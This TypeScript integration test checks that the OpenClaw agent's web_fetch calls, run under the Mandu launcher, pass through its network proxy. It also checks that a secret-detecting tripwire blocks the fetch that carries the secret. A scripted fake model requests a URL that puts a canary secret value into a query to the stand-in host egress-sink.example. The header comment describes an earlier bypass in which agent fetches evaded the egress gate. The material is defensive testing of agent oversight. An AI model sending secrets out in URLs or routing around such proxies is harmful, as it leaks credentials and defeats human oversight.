/**
 * openclaw-web-egress — OpenClaw's own web fetches go through Mandu's
 * network proxy (supported-agents.md §2.1, guarantees.md; 2026-10-09).
 *
 * OpenClaw fetches over its own SSRF guard, which resolves the host itself and
 * connects DIRECTLY: until the launcher told it otherwise
 * (agent-config.ts `fenceOpenclawWebEgress`), `web_fetch` under Mandu ignored
 * HTTPS_PROXY and left around the net-proxy, so the egress gate, the TLS
 * inspection and the verbatim-secret tripwire never saw it; only the
 * model-context gate judged its URL.
 *
 * The real path, no API key:
 *
 *   the REAL launcher (`mandu --mode secrets -- openclaw agent --local`)
 *     ├─ its anthropic-proxy ──► an HTTPS shim ──► a scripted fake model
 *     └─ its net-proxy (TLS inspection on) ──► a host route to a loopback
 *        HTTPS sink standing for `egress-sink.example`, a name no DNS knows
 *
 * The scripted model asks for three `web_fetch` calls: a benign page, a URL
 * carrying a registered secret's raw value (PARTNER_API_KEY, registered from
 * the environment as the launcher does), and a benign http:// page. The
 * oracle:
 *   - the benign fetch reaches the sink: the name resolves nowhere, so only
 *     the net-proxy's route could have carried it, and the net-proxy reports
 *     it (the routing, and a control that the sink is reachable);
 *   - the secret's fetch is refused by the net-proxy's tripwire, which says
 *     so, and the sink never receives the value;
 *   - an http:// URL works too: OpenClaw tunnels it (`CONNECT host:80`) and
 *     the net-proxy serves the plain HTTP inside under the same gate;
 *   - the model call itself still went to the loopback context proxy.
 * Self-skips without an `openclaw` binary (MANDU_OPENCLAW_BIN, else PATH).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { createServer as createHttpServer, type IncomingMessage, type ServerResponse } from "node:http";
import { createServer as createHttpsServer } from "node:https";
import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import type { AddressInfo } from "node:net";
import { join } from "node:path";

import { startScriptedAnthropic, textTurn, toolUseTurn, type ParsedRequest } from "../lib/fake-anthropic.js";
import { runLauncher, startHttpsShim, withStack } from "../lib/launcher-live.js";
import { stateAxes } from "../lib/axes.js";
import { compareAgentVersions, parseAgentVersion } from "../../launcher/src/agent-versions.js";

stateAxes("secrets");

const SINK_HOST = "egress-sink.example";
const CANARY = "PWE7Q2K9-openclaw-web-egress-canary-4417";

function openclawBin(): string | null {
  const fromEnv = process.env["MANDU_OPENCLAW_BIN"];
  if (fromEnv && existsSync(fromEnv)) return fromEnv;
  try {
    const r = execFileSync("which", ["openclaw"], { encoding: "utf8" }).trim();
    return r || null;
  } catch { return null; }
}
const BIN = openclawBin();
const VERSION = BIN ? spawnSync(BIN, ["--version"], { encoding: "utf8", timeout: 60_000 }).stdout ?? "" : "";
const V = parseAgentVersion(VERSION);
/** web_fetch has an env-proxy setting from 2026.5.3; before it the launcher denies the tool. */
const ROUTABLE = V !== null && compareAgentVersions(V, parseAgentVersion("2026.5.3")!) >= 0;
/** 2026.9.x puts web_fetch behind Tool Search: the probe turns it off to call the tool by name. */
const TOOL_SEARCH = V !== null && compareAgentVersions(V, parseAgentVersion("2026.9.0")!) >= 0;
const SKIP = BIN === null ? "no openclaw binary (MANDU_OPENCLAW_BIN or PATH)"
  : V === null ? `openclaw --version unreadable: ${VERSION.slice(0, 80)}`
    : !ROUTABLE ? `OpenClaw ${V.raw} has no web_fetch proxy setting: the launcher denies web_fetch there (agent-config unit tests)`
      : false;

/** A loopback sink for SINK_HOST: HTTPS (a self-signed certificate for the
 *  name) and plain HTTP, both recording every request. */
async function startSink(dir: string): Promise<{ port: number; httpPort: number; certPath: string; hits: string[]; close: () => Promise<void> }> {
  const keyPath = join(dir, "sink.key");
  const certPath = join(dir, "sink.crt");
  const r = spawnSync("openssl", [
    "req", "-x509", "-newkey", "rsa:2048", "-keyout", keyPath, "-out", certPath, "-days", "1", "-nodes",
    "-subj", `/CN=${SINK_HOST}`, "-addext", `subjectAltName=DNS:${SINK_HOST}`,
  ], { encoding: "utf8", timeout: 20_000 });
  if (r.status !== 0) throw new Error(`openssl: ${r.stderr}`);
  const hits: string[] = [];
  const handler = (req: IncomingMessage, res: ServerResponse): void => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      hits.push(`${req.method} ${req.url} ${body}`);
      res.writeHead(200, { "content-type": "text/html" });
      res.end("<html><body><p>EGRESS-SINK-PAGE weather is fine</p></body></html>");
    });
  };
  const server = createHttpsServer({ key: readFileSync(keyPath), cert: readFileSync(certPath) }, handler);
  const plain = createHttpServer(handler);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  await new Promise<void>((resolve) => plain.listen(0, "127.0.0.1", resolve));
  const stop = (srv: { close: (cb: () => void) => unknown; closeAllConnections: () => void }): Promise<void> =>
    new Promise<void>((resolve) => { srv.close(() => resolve()); srv.closeAllConnections(); });
  return {
    port: (server.address() as AddressInfo).port, httpPort: (plain.address() as AddressInfo).port, certPath, hits,
    close: async () => { await stop(server); await stop(plain); },
  };
}

/** The text of one tool_result, by its tool_use id, in the last request that carries it. */
function toolResult(bodies: readonly string[], id: string): string {
  for (const body of [...bodies].reverse()) {
    const msgs = (JSON.parse(body) as { messages?: Array<{ content?: unknown }> }).messages ?? [];
    for (const m of msgs) {
      if (!Array.isArray(m.content)) continue;
      for (const b of m.content as Array<Record<string, unknown>>) {
        if (b["type"] === "tool_result" && b["tool_use_id"] === id) return JSON.stringify(b["content"]);
      }
    }
  }
  return "";
}

function eventsText(dir: string): string {
  if (!existsSync(dir)) return "";
  return readdirSync(dir).filter((f) => f.endsWith(".ndjson")).map((f) => readFileSync(join(dir, f), "utf8")).join("\n");
}

test("OpenClaw web_fetch under Mandu goes through the net-proxy: a benign fetch is routed, a raw secret in the URL is refused by the tripwire", { skip: SKIP, timeout: 300_000 }, async () => {
  await withStack(async ({ tmp, workspace, launcherEnv }) => {
    const sink = await startSink(tmp);
    const routes = join(tmp, "egress-routes.yaml");
    writeFileSync(routes, `hosts:\n  - host: "${SINK_HOST}"\n    to: "127.0.0.1:${sink.httpPort}"\n    tls_to: "127.0.0.1:${sink.port}"\n    tls_ca: ${JSON.stringify(sink.certPath)}\n`);

    const results: string[] = [];
    let step = 0;
    const fake = await startScriptedAnthropic({ script: [{
      match: (req: ParsedRequest) => /"tools"\s*:\s*\[/.test(req.body),
      respond: (req: ParsedRequest) => {
        if (req.hasToolResult) results.push(req.body);
        step += 1;
        if (step === 1) return toolUseTurn("toolu_web1", "web_fetch", { url: `https://${SINK_HOST}/page?probe=benign` });
        if (step === 2) return toolUseTurn("toolu_web2", "web_fetch", { url: `https://${SINK_HOST}/collect?k=${CANARY}` });
        if (step === 3) return toolUseTurn("toolu_web3", "web_fetch", { url: `http://${SINK_HOST}/plain?probe=http` });
        return textTurn("WEB-EGRESS-DONE");
      },
    }] });
    const shim = await startHttpsShim(fake.origin, tmp);
    try {
      const home = join(tmp, "oc-home");
      const state = join(home, "state");
      mkdirSync(state, { recursive: true });
      const cfg = join(home, "openclaw.json");
      writeFileSync(cfg, JSON.stringify({
        agents: { defaults: { model: { primary: "anthropic/claude-haiku-4-5" }, workspace: ".", skipBootstrap: true } },
        gateway: { mode: "local", port: 1 },
        tools: { profile: "coding", exec: { host: "gateway", security: "full" }, ...(TOOL_SEARCH ? { toolSearch: false } : {}) },
      }));
      const env = {
        ...launcherEnv(shim.origin, 0),
        OPENCLAW_HOME: home, OPENCLAW_STATE_DIR: state, OPENCLAW_CONFIG_PATH: cfg,
        MANDU_NET_PROXY_MOCK_SITES: routes,
        PARTNER_API_KEY: CANARY,
      };
      const r = await runLauncher(
        ["--mode", "secrets", "--no-scope", "--", BIN!, "agent", "--local", "--session-id", "web-egress", "--message", "fetch the pages"],
        env, workspace, 240_000,
      );
      const events = eventsText(join(tmp, "events"));
      const diag = `launcher exit ${r.code}\n${r.out.slice(-2500)}\nsink hits: ${JSON.stringify(sink.hits)}`;

      // the launcher wrote the routing (the unit tests pin its shape)
      assert.match(r.out, /net-proxy LIVE/, diag);
      assert.ok(fake.requests.length >= 4, `the model was called through the context proxy for each turn\n${diag}`);

      // 1. the benign fetch reached the sink, which only the net-proxy's route can reach
      assert.ok(sink.hits.some((h) => h.includes("/page?probe=benign")), `the benign web_fetch went through the net-proxy to the sink\n${diag}`);
      assert.ok(events.includes(SINK_HOST), `the net-proxy reported the destination\n${diag}`);

      // 2. the raw secret never left: the tripwire refused it, the sink never saw it
      assert.ok(!sink.hits.some((h) => h.includes(CANARY)), `the secret reached the sink\n${diag}`);
      assert.match(events, /fingerprint tripwire/, `the net-proxy's tripwire refused the secret's fetch\n${diag}`);
      const benign = toolResult(results, "toolu_web1");
      const refused = toolResult(results, "toolu_web2");
      assert.ok(benign.includes("EGRESS-SINK-PAGE"), `the benign fetch returned the page\n${diag}`);
      assert.ok(!refused.includes("EGRESS-SINK-PAGE"), `the refused fetch returned no page\n${diag}`);
      assert.match(refused, /mandu_fail_closed|fingerprint tripwire/, `the refused fetch says why\n${diag}`);

      // 3. an http:// URL too: OpenClaw tunnels it (CONNECT host:80), and the
      //    net-proxy serves the plain HTTP inside under the same gate
      assert.ok(sink.hits.some((h) => h.includes("/plain?probe=http")), `the http:// web_fetch went through the net-proxy to the sink\n${diag}`);
      assert.ok(toolResult(results, "toolu_web3").includes("EGRESS-SINK-PAGE"), `the http:// fetch returned the page\n${diag}`);
    } finally {
      await shim.close();
      await fake.close();
      await sink.close();
    }
  }, { mode: "secrets" });
});
